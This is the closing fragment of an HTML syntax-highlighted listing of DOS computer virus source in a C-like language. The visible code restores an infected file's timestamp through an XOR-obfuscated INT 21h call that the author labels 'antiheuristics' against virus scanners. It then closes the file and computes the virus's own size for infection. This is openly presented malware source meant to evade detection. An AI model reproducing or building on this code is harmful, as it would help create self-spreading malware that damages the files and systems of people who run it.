</span><span class="sc0">          </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">POP</span><span class="sc0"> </span><span class="sc11">CX</span><span class="sc10">;</span><span class="sc0">                                  </span><span class="sc2">// time of the file
</span><span class="sc0">          </span><span class="sc11">AX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x5701</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc4">0x8086</span><span class="sc10">;</span><span class="sc0">                      </span><span class="sc2">// and put them back
</span><span class="sc0">          </span><span class="sc11">AX</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x8086</span><span class="sc10">;</span><span class="sc0">                              </span><span class="sc2">// on it with some
</span><span class="sc0">          </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">INT</span><span class="sc0"> </span><span class="sc4">0x21</span><span class="sc10">;</span><span class="sc0">                                </span><span class="sc2">// antiheuristics
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">FCLOSE</span><span class="sc10">(,</span><span class="sc11">handle</span><span class="sc10">);</span><span class="sc0">            </span><span class="sc2">// Close file (we're done)
</span><span class="sc0">  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc11">get_virus_size</span><span class="sc10">()</span><span class="sc0">           </span><span class="sc2">// Gets address of latest memory byte of
</span><span class="sc10">{</span><span class="sc0">                               </span><span class="sc2">// virus, effectively getting the virus
</span><span class="sc0">  </span><span class="sc11">AX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> #</span><span class="sc11">virus_end</span><span class="sc10">-</span><span class="sc0">#</span><span class="sc11">main</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc2">// size
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc3">/*****( This is the end, my dear friend )*************************************/</span><span class="sc0">
</span></div></body>
</html>
